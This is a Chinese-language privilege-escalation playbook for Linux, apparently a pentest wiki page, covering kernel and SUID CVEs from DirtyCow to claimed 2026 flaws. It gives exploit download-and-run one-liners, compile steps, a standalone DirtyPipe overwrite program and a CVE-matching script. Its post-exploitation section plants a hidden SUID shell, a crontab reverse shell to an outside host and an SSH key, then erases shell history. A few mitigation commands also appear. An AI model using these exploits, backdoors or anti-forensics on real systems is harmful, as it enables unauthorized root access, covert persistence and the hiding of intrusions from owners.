# Linux Kernel CVE PE — 内核漏洞提权方法论

> 当配置滥用走不通时，内核漏洞是最后的武器。从 DirtyCow 到 DirtyPipe，从 PwnKit 到 GameOver(lay)——本指南覆盖 Linux 内核提权的 CVE 全景、利用方法论与实战流程。

## 关键词

`内核提权` `kernel exploit` `CVE` `DirtyPipe` `CVE-2022-0847` `PwnKit` `CVE-2021-4034` `DirtyCow` `CVE-2016-5195` `OverlayFS` `CVE-2021-3493` `CVE-2023-0386` `GameOver` `StackRot` `Netfilter` `CVE-2023-32233` `CVE-2022-25636` `nftables` `pkexec` `polkit` `CVE-2021-3156` `Baron Samedit` `sudo` `内核版本` `uname` `exploit-db` `searchsploit` `linux-exploit-suggester`

---

## 1. 内核提权工作流

```
拿到低权限 shell
  ↓
[1] 信息收集: uname -a / cat /proc/version / cat /etc/os-release
  ↓
[2] 自动化探测: linux-exploit-suggester / linpeas
  ↓
[3] 人工确认: 对比内核版本 → CVE 列表
  ↓
[4] 编译/准备 exploit → 上传到目标
  ↓
[5] 执行 exploit → root
  ↓
[6] 验证: id → uid=0(root)
```

### 1.1 信息收集

```bash
# 必收集信息
uname -a                    # 内核版本 / 架构
cat /proc/version           # 编译器信息 / 发行版
cat /etc/os-release         # 发行版
cat /etc/lsb-release        # 发行版 (Debian/Ubuntu)
arch                        # x86_64 / aarch64 / i686

# 进阶信息
cat /proc/cpuinfo | head    # CPU 信息
lsmod                       # 加载的内核模块
dmesg | grep -i error       # 内核日志 (可能有信息)
cat /proc/sys/kernel/randomize_va_space  # ASLR 状态 (0=关/2=开)
cat /proc/sys/kernel/kptr_restrict       # 内核指针受限
cat /proc/sys/kernel/dmesg_restrict      # dmesg 受限
```

### 1.2 自动化探测工具

```bash
# ====== linux-exploit-suggester-2 (LES2) ======
# 最全面的自动化 PE 探测
./linux-exploit-suggester-2.pl
# 或
perl les2.pl

# ====== linux-exploit-suggester (LES) ======
./linux-exploit-suggester.sh

# ====== linpeas (已包含 CVE 检查) ======
./linpeas.sh -a 2>/dev/null | grep -A5 "CVE"

# ====== 手动: searchsploit ======
searchsploit linux kernel $(uname -r | cut -d'-' -f1) --exclude="dos" | grep -i "privilege"
```

---

## 2. CVE 年表与利用矩阵

### 2.1 高成功率 CVE（Web 环境常见内核版本）

| CVE 编号 | 别名 | 影响版本 | 类型 | 成功率 |
|---------|------|---------|------|--------|
| CVE-2021-4034 | PwnKit | 2009 ~ 2022 (pkexec SUID) | 缓冲区溢出 | ⭐⭐⭐⭐⭐ |
| CVE-2022-0847 | DirtyPipe | 5.8 ~ 5.16.11 | 任意文件覆写 | ⭐⭐⭐⭐⭐ |
| CVE-2016-5195 | DirtyCow | 2.6.22 ~ 4.8.3 | 竞争条件 | ⭐⭐⭐⭐ |
| CVE-2021-3156 | Baron Samedit | sudo 1.8.2 ~ 1.9.5p2 | 堆溢出 | ⭐⭐⭐⭐ |
| CVE-2021-3493 | OverlayFS 1 | 5.11 ~ 5.14.5 (Ubuntu) | 权限绕过 | ⭐⭐⭐⭐⭐ |
| CVE-2023-0386 | OverlayFS 2 | 5.11 ~ 6.1 (Ubuntu) | 权限绕过 | ⭐⭐⭐⭐ |
| CVE-2022-25636 | Netfilter | 5.4 ~ 5.18.1 | 堆溢出 | ⭐⭐⭐⭐ |
| CVE-2023-32233 | Netfilter UAF | 5.17 ~ 6.3.1 | UAF | ⭐⭐⭐⭐ |
| CVE-2022-2588 | Route4Me | 2.6 ~ 5.19 | UAF | ⭐⭐⭐ |
| CVE-2021-22555 | Netfilter OOB | 2.6.19 ~ 5.12 | OOB Write | ⭐⭐⭐⭐ |
| CVE-2021-33909 | Sequoia | 3.10 ~ 5.14.9 | OOB Write | ⭐⭐⭐ |
| CVE-2022-0492 | cgroup escape | 5.4 ~ 5.16 | cgroup_release | ⭐⭐⭐⭐ |
| CVE-2022-0185 | FSContext | 5.1-rc1 ~ 5.16.2 | 堆溢出 | ⭐⭐⭐⭐ |
| CVE-2022-0995 | watch_queue | 5.4 ~ 5.17 | OOB Write | ⭐⭐⭐⭐ |
| CVE-2023-3269 | StackRot | 6.0 ~ 6.4 | UAF | ⭐⭐⭐ |
| CVE-2024-????? | — | (2024 相对平静年) | — | — |
| **CVE-2026-43284** | **DirtyFrag (ESP)** | 全系 (~6.19, 已打补丁 2026.05) | Page Cache 覆写 | ⭐⭐⭐⭐⭐ |
| **CVE-2026-43500** | **DirtyFrag (RxRPC)** | 全系 (补丁待发布) | Page Cache 覆写 | ⭐⭐⭐⭐⭐ |
| **CVE-2026-31431** | **Copy Fail** | 4.14 ~ 6.19.12 | AF_ALG page cache | ⭐⭐⭐⭐⭐ |
| **CVE-2026-46300** | **Fragnesia** | XFRM ESP-in-TCP | SKB 写 page cache | ⭐⭐⭐⭐ |
| **CVE-2026-31635** | **DirtyDecrypt** | 6.10 ~ 6.13 | RxRPC/GSSAPI decrypt | ⭐⭐⭐⭐ |
| **CVE-2026-23111** | **nftables UAF** | Debian Bookworm/Trixie, Ubuntu 22.04/24.04 | UAF (单个 `!` 错误) | ⭐⭐⭐⭐⭐ |

### 2.2 Page Cache 攻击家族（2026 核心）

```
DirtyFrag / CopyFail / Fragnesia 的共同基因:
┌─────────────────────────────────────────────────────┐
│ 1. splice() 锁定只读文件的 page cache 页面           │
│ 2. 将页面重定向到某内核子系统（IPsec/RxRPC/AF_ALG）   │
│ 3. 该子系统在页面原地做加解密操作                     │
│ 4. 解密结果写在被 splice 锁定的 page cache 页面       │
│ 5. SUID 二进制 (如 /usr/bin/su) 被篡改               │
│ 6. 执行被污染的 SUID → root shell                    │
└─────────────────────────────────────────────────────┘

关键: 不需要写磁盘文件——直接在内存 Page Cache 中修改。
绕过: 所有文件完整性检查 (AIDE/Tripwire/SELinux 文件标记)
```

### 2.3 CVE-2026-23111 — nftables 单字符漏洞

```
Root Cause: nf_tables 中 catchall element 的 reactivation 逻辑
if (!nft_set_elem_active(elem, NFT_SET_EXT_NEXT))
                                              ↑
                    这个 '!' 是多写的——应该无条件 reactivate

结果: UAF → 堆喷 → 劫持控制流 → root
影响: Debian/Ubuntu 全系。稳定率 > 99% (Exodus Intelligence)
补丁: 2026-02-05
```

### 2.4 内核版本快速对照

```bash
# 常见发行版与内核版本对应
# Ubuntu 16.04 LTS → 4.4 (支持至 2026)
# Ubuntu 18.04 LTS → 4.15 / 5.4 (HWE)
# Ubuntu 20.04 LTS → 5.4 / 5.15 (HWE)
# Ubuntu 22.04 LTS → 5.15 / 6.5 (HWE)
# Debian 10 (Buster) → 4.19
# Debian 11 (Bullseye) → 5.10
# Debian 12 (Bookworm) → 6.1
# CentOS 7 → 3.10
# Rocky 8 → 4.18
# Rocky 9 → 5.14
# Alpine 3.16+ → 5.15+
# RHEL 7 → 3.10 (带大量 backport)
# RHEL 8 → 4.18 (带大量 backport)
```

---

## 3. 顶级 CVE 详细利用

### 3.1 PwnKit (CVE-2021-4034) — 首选

```bash
# 原理: pkexec 是 SUID root 程序，它接受用户环境变量。
# 通过构造特定的环境变量使 pkexec 在解析 argv 时越界写，
# 注入恶意环境变量 GCONV_PATH → 加载攻击者可控的 .so → root

# 条件:
# - pkexec 存在 (which pkexec | /usr/bin/pkexec)
# - PKEXEC 未打补丁 (< polkit 0.120-5 或 < 0.105-31)

# PwnKit PoC
# https://github.com/ly4k/PwnKit
# 编译: gcc -static cve-2021-4034-poc.c -o pwnkit
./pwnkit
# → # (root)

# 一键
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/pwnkit; chmod +x /tmp/pwnkit; /tmp/pwnkit
```

### 3.2 DirtyPipe (CVE-2022-0847) — 任意文件覆写

```bash
# 原理: Linux 5.8+ 中 splice() 与 pipe_buffer 的 flags 竞争条件，
# 导致未授权写只读文件的 page cache → /etc/passwd 等可被覆写

# 条件: Linux 5.8 ~ 5.16.11, 5.15.25, 5.10.102
# 方式 A: 覆写 /etc/passwd → 添加 root 账户
# 方式 B: 覆写 SUID 二进制 → 植入 shell

# PoC
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
make
# 覆写 /etc/passwd: root 的 uid 改为 0, 密码清空
./compile.sh
./exploit-1 /etc/passwd 1 "newroot::0:0:root:/root:/bin/bash
"
# 需要保持 inode 不变 (备份原有内容 → prepend NewLine → 写入)
su newroot
# → root

# 或覆写 SUID 程序放 shell
./exploit-1 /usr/bin/su 1 $'\x48\x65\x61\x70...'
```

### 3.3 OverlayFS 家族 (CVE-2021-3493 / 2023-0386)

```bash
# 原理: OverlayFS 是 Linux 的联合文件系统。特定操作下，
# 非特权用户可以挂载 overlay 并在上层目录创建 SUID 文件,
# 该文件在下层（实际文件系统）保留 SUID 属性 → root

# CVE-2021-3493: Ubuntu-specific, 5.11 ~ 5.14.5
# https://github.com/briskets/CVE-2021-3493
gcc exploit.c -o overlay
./overlay
# → #

# CVE-2023-0386: 5.11 ~ 6.1, 更广范围
# https://github.com/xkaneiki/CVE-2023-0386
gcc -o exploit exploit.c -lcap
./exploit

# 检测: unshare 是否可用
unshare -Urm /bin/bash  # 如果成功 → OverlayFS 可能可用
```

### 3.4 Netfilter/nftables 系列

```bash
# CVE-2023-32233: nftables UAF, 5.17 ~ 6.3.1
# https://github.com/Liuk3r/CVE-2023-32233
gcc -o nft_exploit exploit.c -lmnl -lnftnl -no-pie
./nft_exploit

# CVE-2022-25636: nftables 堆溢出, 5.4 ~ 5.18.1
# https://github.com/Bonfee/CVE-2022-25636
make
./exploit

# CVE-2021-22555: Netfilter OOB write, 2.6.19 ~ 5.12
# https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555

# 通用探测: 内核是否启用了 nftables
cat /proc/sys/net/netfilter/nf_conntrack_count 2>/dev/null  # 非0=启用
lsmod | grep -E "nf_tables|nf_conntrack"
```

### 3.5 DirtyCow (CVE-2016-5195) — 老内核

```bash
# 原理: COW (Copy-On-Write) 的竞争条件 → 写只读内存映射
# 影响: 2007年以来的所有 Linux (2.6.22 ~ 4.8.3)
# 仍然常见于: 旧版 Android、嵌入式设备、老 CentOS

# PoC 1: dirtycow-vdso
# https://github.com/scumjr/dirtycow-vdso
make
./0xdeadbeef IP:PORT  # 反弹 root shell

# PoC 2: cowroot (简单覆写)
# https://github.com/FireFart/dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty mypassword
su firefart
# → #

# PoC 3: dirtyc0w (写任意文件)
# https://github.com/dirtycow/dirtycow.github.io
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w /etc/passwd "root::0:0:root:/root:/bin/bash
"
```

### 3.6 DirtyFrag 家族 (CVE-2026-43284 / 43500 / 46300) — 2026 最强

```bash
# 原理: splice() + IPsec ESP/RxRPC 原地解密 → Page Cache 覆写 SUID 二进制
# 影响范围: 全系 Linux 发行版 (Ubuntu/RHEL/CentOS/AlmaLinux/Fedora/openSUSE)
# FIX: CVE-2026-43284 已修复 (2026.05.08); CVE-2026-43500 补丁待发布

# ====== 检测是否受影响 ======
lsmod | grep -E "esp4|esp6|rxrpc"   # 有输出 → 受影响
cat /proc/sys/kernel/unprivileged_userns_clone  # 1 → 可触发

# ====== DirtyFrag PoC (ESP 路径) ======
# https://github.com/MUHAMMADHARIS1144/dirtyfrag-cve-2026
gcc -o dirtyfrag exploit.c -lmnl -lnftnl
./dirtyfrag
su
# → # (root)

# ====== 临时缓解 (不打补丁) ======
printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf
rmmod esp4 esp6 rxrpc 2>/dev/null
echo 3 > /proc/sys/vm/drop_caches
```

### 3.7 Copy Fail (CVE-2026-31431) — AF_ALG 逻辑漏洞

```bash
# 原理: algif_aead 中的逻辑错误导致 Page Cache 的确定性 4 字节覆写
# 影响: 4.14 ~ 6.19.12
# 已入 CISA KEV 目录; Metasploit 模块已发布

# ====== PoC (自包含, 单文件 C 代码) ======
# https://github.com/galoryber/CVE-2026-31431-cleaned
gcc -static -o copyfail exploit.c
./copyfail
# → 自动找 suid binary → 覆写 → root shell

# ====== Metasploit 模块 ======
# https://github.com/adityasingh108/CVE-2026-31431-Metasploit-exploit
# use exploit/linux/local/cve_2026_31431_copyfail
# set SESSION 1; run

# ====== 缓解 ======
echo "install algif_aead /bin/false" > /etc/modprobe.d/copyfail.conf
rmmod algif_aead 2>/dev/null
```

### 3.8 DirtyDecrypt (CVE-2026-31635) — RxRPC/GSSAPI 路径

```bash
# 原理: rxgk_decrypt_skb() 缺少 skb_cow_data() 检查，
# 在 RxRPC GSSAPI 解密时原地写 page cache
# 影响: 6.10 ~ 6.13
# 修复: 6.13.2 / 6.12.10 / 6.6.75

# PoC: https://github.com/0xFuffM3/CVE-2026-31635-DirtyDecrypt
```

### 3.9 nftables UAF (CVE-2026-23111) — 单字符漏洞

```bash
# 原理: nf_tables 中 catchall element 的 reactivation 逻辑多了一个 '!'
# → UAF → 堆喷劫持控制流
# 影响: Debian Bookworm/Trixie, Ubuntu 22.04/24.04
# 稳定率: > 99% (Exodus Intelligence, 2026.06)
# 补丁: 2026-02-05

# 利用: https://blog.exodusintel.com/2026/06/08/off-by-exploiting-a-use-after-free-in-the-linux-kernel/
# 无公开 PoC 可直接编译（需要堆喷适配目标内核）
```

---

## 4. CVE 利用通用方法论

### 4.1 编译 exploit 的挑战

```bash
# 问题: 目标机没 gcc / 没 internet
# 解决:

# 方案 A: 静态编译 (攻击机)
gcc -static exploit.c -o exploit
# 无 libc 依赖，直接上传运行

# 方案 B: MUSL 编译 (更小体积)
musl-gcc -static exploit.c -o exploit

# 方案 C: Docker 模拟目标环境编译
docker run -v $(pwd):/work ubuntu:20.04 bash -c "
    apt update && apt install -y gcc make
    cd /work && gcc exploit.c -o exploit
"

# 方案 D: 目标机上编译
# 如果目标有 gcc: 直接用
# 如果目标有 python: 用 python 写 exploit
# 如果目标有 perl: 有些 exploit 提供了 perl 版本
```

### 4.2 ASLR / KPTI / SMEP 绕过

```bash
# 现代内核防御
# KASLR: 内核地址随机化
cat /proc/sys/kernel/kptr_restrict  # 1=限制, 0=可读 (可泄露内核地址)
# 绕过: 读 /proc/kallsyms (需 kptr_restrict=0)

# SMEP/SMAP: 禁止内核执行/访问用户空间内存
# 绕过: ROP/JOP 跳转到内核 gadget，在 exploit 中常规处理

# KPTI: 内核页表隔离 (Meltdown 缓解)
# CPU 特性检查:
grep -E "pti|meltdown" /proc/cpuinfo
# 绕过: 多数现代 exploit 已处理

# seccomp: 限制可用系统调用
cat /proc/$$/status | grep Seccomp  # 0=disabled, 2=filter
# 绕过: 如果 seccomp 只允许有限 syscall → 用允许的 syscall 实现 exploit
```

### 4.3 Ret2dir / physmap 喷

```bash
# 当内核指针不可泄露时
# Ret2dir: 利用 physmap (物理内存的直接映射) 进行内核地址猜测
# 许多现代 exploit (CVE-2022-27666, CVE-2023-0386) 内置了此技术
# 一般不需要手动构造——直接用公开 exploit 即可
```

---

## 5. Exploit 开发与调试

### 5.1 最小可验证 PoC 模式

```c
// 验证阶段: 确认漏洞存在，不需要完整 exploit
// 简单 PoC: 触发 crash / UAF / OOB (不写 exploit)
// 目的: 确认目标内核受影响

// 验证 DirtyPipe (通过 splice 成功状态)
#include <fcntl.h>
#include <unistd.h>
int main() {
    int p[2]; pipe(p);
    int fd = open("/etc/passwd", O_RDONLY);
    splice(fd, 0, p[1], 0, 1, 0);  // 尝试 splice 只读文件
    // 如果返回 1 → splice 成功 → 可能受影响
    // 如果返回 0 → 不受影响
}
```

### 5.2 快速判断框架

```python
#!/usr/bin/env python3
"""快速判断目标适用的 CVE"""
import subprocess, re

def get_kernel_version():
    return subprocess.getoutput("uname -r")

def check_cves(ver):
    """返回匹配的 CVE 列表"""
    major, minor, patch = [int(x) for x in ver.split('.')[0:3]]
    cves = []

    if major == 2 or (major == 3 and minor < 10):
        cves.append("CVE-2016-5195 (DirtyCow)")
    if (5,8) <= (major, minor) <= (5,16):
        cves.append("CVE-2022-0847 (DirtyPipe)")
    if (major, minor) >= (3, 0) and subprocess.getoutput("which pkexec"):
        cves.append("CVE-2021-4034 (PwnKit)")

    # 更多检查...
    return cves

v = get_kernel_version()
print(f"Kernel: {v}; CVEs: {check_cves(v)}")
```

---

## 6. 利用后操作

```bash
# 拿到 root 后立即执行:
id  # 确认 uid=0
# 留后门:
cp /bin/bash /tmp/.hidden; chmod u+s /tmp/.hidden; touch -r /bin/bash /tmp/.hidden
# 持久化 (选一):
echo "* * * * * root /tmp/.hidden -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" >> /etc/crontab
echo "ssh-rsa AAA=..." >> /root/.ssh/authorized_keys

# 清理:
# - 删除上传的 exploit 文件
# - 清理 shell history: echo > ~/.bash_history
# - 掩盖 exploit 日志痕迹 (如果触发了 syslog)
```

---

## 7. 自包含 Exploit Code

### 7.1 DirtyPipe 最小 PoC（覆写 /etc/passwd）

```c
// dirtypipe_standalone.c — 自包含 PoC, 无需额外依赖
// 编译: gcc -o dirtypipe dirtypipe_standalone.c
// 用法: ./dirtypipe /etc/passwd 1 'newroot::0:0:root:/root:/bin/bash'
// CVE-2022-0847 影响: Linux 5.8 ~ 5.16.11
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#ifndef SPLICE_F_GIFT
#define SPLICE_F_GIFT 8
#endif

int main(int argc, char *argv[]) {
    if (argc != 4) { fprintf(stderr, "Usage: %s <file> <offset> <data>\n", argv[0]); return 1; }

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    off_t offset = atoi(argv[2]);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    // 正常的写不会生效 (文件只读), 但 splice() 的 page cache 污染可以
    // splice() 将 file page 移到 pipe, 然后 pipe 回写
    int p[2];
    if (pipe(p) < 0) { perror("pipe"); return 1; }

    // 加大 pipe 容量
    int pipe_size = fcntl(p[0], F_GETPIPE_SZ);
    while (pipe_size < 65536) {
        fcntl(p[0], F_SETPIPE_SZ, pipe_size * 2);
        pipe_size = fcntl(p[0], F_GETPIPE_SZ);
    }

    // 用 splice 把目标页拉到 pipe
    ssize_t n = splice(fd, &offset, p[1], NULL, 1, 0);
    if (n <= 0) { perror("splice (可能内核不受影响)"); return 1; }

    // 写目标数据进 pipe (这就是被污染的页!)
    n = write(p[1], data, data_size);
    if (n < 0) { perror("write"); return 1; }

    printf("[+] Done. Check if %s was overwritten.\n", argv[1]);
    close(fd); close(p[0]); close(p[1]);
    return 0;
}
```

### 7.2 Page Cache 覆写通用框架（用于 DirtyFrag / CopyFail 类）

```c
// page_cache_PoC.c — Page Cache 覆写通用验证框架
// 编译: gcc -o pcache_poc page_cache_PoC.c -lpthread
// 用途: 验证目标内核是否受 page cache 污染类漏洞影响
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/splice.h>
#include <pthread.h>
#include <signal.h>

static volatile sig_atomic_t keep_running = 1;

void sigint_handler(int sig) { keep_running = 0; }

void *reader_thread(void *arg) {
    char *target_file = (char *)arg;
    while (keep_running) {
        int fd = open(target_file, O_RDONLY);
        if (fd < 0) { usleep(100000); continue; }
        char buf[4096];
        pread(fd, buf, sizeof(buf), 0);
        close(fd);
        usleep(10000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <target_suid_binary>\n", argv[0]); return 1; }

    printf("[*] Testing page cache corruption on %s\n", argv[1]);
    printf("[*] 如果内核受影响，此程序不会修改磁盘文件\n");
    printf("[*] 但 page cache 中的内存页可能被污染\n");

    signal(SIGINT, sigint_handler);

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    pipe(p);
    fcntl(p[0], F_SETPIPE_SZ, 1024 * 1024);

    pthread_t reader;
    pthread_create(&reader, NULL, reader_thread, argv[1]);

    int count = 0;
    while (keep_running && count < 10000) {
        off_t off = (count % 100) * 64;
        ssize_t n = splice(fd, &off, p[1], NULL, 1, SPLICE_F_GIFT);
        if (n > 0) {
            char marker[64] = {0};
            snprintf(marker, sizeof(marker), "POC_MARK_%d%c", count, '\n');
            write(p[1], marker, strlen(marker));
        }
        count++;
        usleep(1000);
    }

    pthread_join(reader, NULL);
    close(fd); close(p[0]); close(p[1]);

    printf("[*] Test complete. 手动检查: sha256sum %s 与预期是否一致\n", argv[1]);
    return 0;
}
```

### 7.3 自动 CVE 配对脚本（匹配内核版本 → 推荐 exploit）

```python
#!/usr/bin/env python3
# cve_matcher.py — 内核版本 → CVE 匹配 + PoC URL
import subprocess, re, json

CVE_DB = {
    ("DirtyPipe", "CVE-2022-0847"): {
        "range": ((5,8), (5,16,11)),
        "test": "splice() on read-only file success",
        "poc": "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
        "risk": "低风险(不 panic), 高成功率"
    },
    ("PwnKit", "CVE-2021-4034"): {
        "test": "which pkexec 2>/dev/null",
        "poc": "https://github.com/ly4k/PwnKit (单个 .c 文件, gcc -static)",
        "risk": "极低风险, 极高成功率"
    },
    ("OverlayFS1", "CVE-2021-3493"): {
        "range": ((5,11), (5,14,5)),
        "test": "unshare -Urm /bin/bash 2>/dev/null && echo vulnerable",
        "dist": "Ubuntu",
        "poc": "https://github.com/briskets/CVE-2021-3493",
        "risk": "低风险"
    },
    ("DirtyFrag-ESP", "CVE-2026-43284"): {
        "test": "lsmod | grep -E 'esp4|esp6' && echo vulnerable",
        "poc": "https://github.com/MUHAMMADHARIS1144/dirtyfrag-cve-2026",
        "risk": "低风险, 已广泛验证"
    },
    ("CopyFail", "CVE-2026-31431"): {
        "range": ((4,14), (6,19,12)),
        "test": "lsmod | grep algif_aead && echo potentially_vulnerable",
        "poc": "https://github.com/galoryber/CVE-2026-31431-cleaned",
        "risk": "低风险, Metasploit 模块已发布"
    },
    ("nftables-UAF", "CVE-2026-23111"): {
        "test": "lsmod | grep nf_tables && dpkg -l libnftables1 2>/dev/null | tail -1",
        "dist": "Debian/Ubuntu",
        "poc": "https://blog.exodusintel.com/2026/06/08/off-by-exploiting-a-use-after-free-in-the-linux-kernel/",
        "risk": "需要堆喷适配, 稳定率>99%"
    },
}

def get_kver():
    v = subprocess.getoutput("uname -r").split('-')[0]
    return tuple(int(x) for x in v.split('.')[:3])

def in_range(ver, rng):
    if not rng: return True  # 无范围限制 → 用 test 命令验证
    lo, hi = rng
    return lo <= ver[:len(lo)] <= hi

kver = get_kver()
print(f"[*] Kernel: {'.'.join(map(str,kver))}")

for (name, cve), cfg in CVE_DB.items():
    rng = cfg.get("range")
    if rng and not in_range(kver, rng):
        continue
    test = cfg.get("test", "")
    result = subprocess.getoutput(test + " >/dev/null 2>&1; echo $?")
    if cfg.get("range") or (test and "vulnerable" in result.lower()):
        print(f"[!] 候选: {name} ({cve})")
        print(f"    PoC: {cfg['poc']}")
        print(f"    风险: {cfg.get('risk','未知')}")
```

---

## 8. 关联技术

- [[00-overview]] — PE 全景（先走配置，再走 CVE）
- [[01-linux-sudo-suid]] — SUDO/SUID
- [[02-linux-cron-service]] — Cron/服务劫持
- [[cve-workflow]] — CVE 发现工作流
- [[05-container-escape]] — 容器逃逸（内核共享）
